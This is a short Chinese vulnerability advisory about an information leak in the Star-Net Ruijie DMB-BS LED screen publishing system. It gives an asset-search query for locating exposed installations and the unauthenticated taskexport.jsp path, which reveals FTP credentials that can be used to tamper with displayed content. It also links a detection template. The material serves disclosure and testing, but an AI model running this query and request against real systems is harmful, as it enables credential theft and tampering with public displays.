# 星网锐捷 DMB-BS LED屏信息发布系统taskexport接口处存在敏感信息泄露

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">星网锐捷 DMB-BS LED屏信息发布系统taskexport接口处存在敏感信息泄露，攻击者可以可以通过此漏洞读取 FTP 服务器地址、端口及账号密码，通过 FTP 可篡改 LED 发布信息</font>  
**二、影响版本**

星网锐捷信息发布系统

**三、资产测绘**

```plain
app="STAR_NET-数字标牌系统"
```

![1714230441699-d5a76730-3ee2-45ac-ac2c-f0fc80a888f2.png](./img/L5KeVGbPn4qhJj98/1714230441699-d5a76730-3ee2-45ac-ac2c-f0fc80a888f2-017172.png)

●登录![1713938803895-b19dd8b0-de6f-4aa9-9c79-2871255ec1ee.png](./img/L5KeVGbPn4qhJj98/1713938803895-b19dd8b0-de6f-4aa9-9c79-2871255ec1ee-123299.png)

**四、漏洞复现**

```plain
/dmb/out/taskexport.jsp?taskcode
```

![1713938753911-0910a298-b3a4-49a1-842c-5baf166b0abd.png](./img/L5KeVGbPn4qhJj98/1713938753911-0910a298-b3a4-49a1-842c-5baf166b0abd-242564.png)

[XWRJ-DMB-BS-InformationLeakage.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1719200545313-daca3f8d-524a-48d9-83ba-d930e0d9385b.yaml)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ef3dwszacv0ypayp>